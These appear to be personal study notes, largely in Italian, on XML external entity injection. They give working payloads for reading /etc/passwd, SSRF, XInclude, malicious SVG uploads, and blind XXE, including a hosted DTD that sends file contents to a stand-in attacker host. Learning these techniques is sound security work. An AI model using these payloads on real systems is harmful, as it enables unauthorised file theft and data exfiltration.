xml external entity injection

DETECTION:
burp scanner può detectare xxe 
file retrieval definendo una external entity basata su well-known operating system file (bisogna conoscere i file name e path in base al sistema operativo specifico)
blind lookup con collaborator
possibile testare user supplied data per provare XInclude

vulnerabilità sul processo di dati XML
spesso permette di vedere file del backend file system e permette di intereagire con backend e applicazioni esterne con cui interagisce l'app vulnerabile.

in alcuni casi è possibile avanzare ad SSRF attraverso XXE

XML format usato per trasferimento di dati nel body delle richieste

di solito vengono usate librerie standard o API nel backend per elaborare il formato XML in dati leggibili

TIPI DI ATTACCO:
  - retrieve files
  - perform ssrf
  - exfiltrate data out-of-band
  - retrive data via error messages

struttura ad albero
DTD document type definition definisce la struttura di un documento XML
DTD dichiarata con DOCTYPE
DTD può essere contenuta già nel documento o importata da fonti esterne (external DTD) o ibrida.
custom entities possono essere definite nel DTD -> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
per caricare entities da file esterno -> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

XXE per leggere file remoti 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

XXE per SSRF
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

HIDDEN ATTACK SURFACE for XXE injection
possibile surface in posti dove non è visibile l'xml

xinclude attack:
applicazioni possono ricevere dati submittati, salvarli in documenti xlm e poi parsare i files
backend soap request processata da soap request
non è possibile fare il classico attacco modificando il DOCTYPE
è però possibile usare XInclude, parte della specifica XML che consente ai documenti XML di essere buildati da altri sotto documenti.
XInclude può essere messo in qualsiasi data value

da inserire al posto di un valore del parametro della richiesta:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

XXE attacks via MODIFIED CONTENT TYPE

For example, if a normal request contains the following:
        
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

Then you might be able submit the following request, with the same result:
        
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

If the application tolerates requests containing XML in the 
message body, and parses the body content as XML, then you can reach the
 hidden XXE attack surface simply by reformatting requests to use the 
XML format.

XXE VIA FILE UPLOAD
Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

esempio di file SVG malevolo
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 

BLIND XXE 
exploitabile con out-of-band interactions e triggerando XML parsing errors
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

alcune volte potrebbero essere filtrati allora si usano altri parametri come myparameterentity
<!ENTITY % myparameterentity "my parameter entity value" >
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>


exfiltrate data
richiesto che l'attacker hosti un DTD malevolo che può essere richiamato dall'xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

This DTD carries out the following steps:
        
Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.        
Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

attacker host -> http://web-attacker.com/malicious.dtd

payload da submittare all'applicazione -> 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
         
Note:          
This technique might not work with some file contents, including the newline characters contained in the /etc/passwd
file. This is because some XML parsers fetch the URL in the external 
entity definition using an API that validates the characters that are 
allowed to appear within the URL. In this situation, it might be 
possible to use the FTP protocol instead of HTTP. Sometimes, it will not
be possible to exfiltrate data containing newline characters, and so a 
file such as /etc/hostname can be targeted instead.


BLIND XXE VIA ERROR MESSAGES

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

nell'errore appare il testo del file dichiarato nella prima entity

Exploiting blind XXE by repurposing a local DTD
so what quando le out of bound connections sono chiuse e non è possibile caricare un DTD da un server remoto? in questo caso è possibile triggerare un loophole error message
If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. 
            
